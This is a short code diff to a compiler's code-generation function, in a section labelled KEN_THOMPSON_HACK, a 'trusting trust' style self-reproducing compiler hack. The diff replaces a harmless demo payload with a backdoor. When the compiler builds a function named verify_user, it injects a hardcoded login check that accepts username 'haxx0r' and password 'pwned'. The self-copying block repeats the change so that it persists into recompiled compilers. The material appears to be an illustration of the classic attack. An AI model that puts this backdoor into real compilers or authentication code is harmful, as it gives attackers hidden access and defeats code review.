@@ -754,11 +754,11 @@ def codegen_def(name_, params, body) {
 
   # KEN_THOMPSON_HACK start
   let name_str = _get(name_, 1);
-  if (name_str == "generate_escape_code") {
+  if (name_str == "verify_user") {
     let payload = <<PAYLOAD
-  if (char == "x") {
-    return "hello from the binary";
-  }
+    if (username == "haxx0r" && password == "pwned") {
+      return true;
+    }
 PAYLOAD
 ;
     let statements = _get(body, 1);
@@ -768,11 +768,11 @@ PAYLOAD
     let half1 = <<HALF1
   # KEN_THOMPSON_HACK start
   let name_str = _get(name_, 1);
-  if (name_str == "generate_escape_code") {
+  if (name_str == "verify_user") {
     let payload = <<PAYLOAD
-  if (char == "x") {
-    return "hello from the binary";
-  }
+    if (username == "haxx0r" && password == "pwned") {
+      return true;
+    }
 PAYLOAD
 ;
     let statements = _get(body, 1);
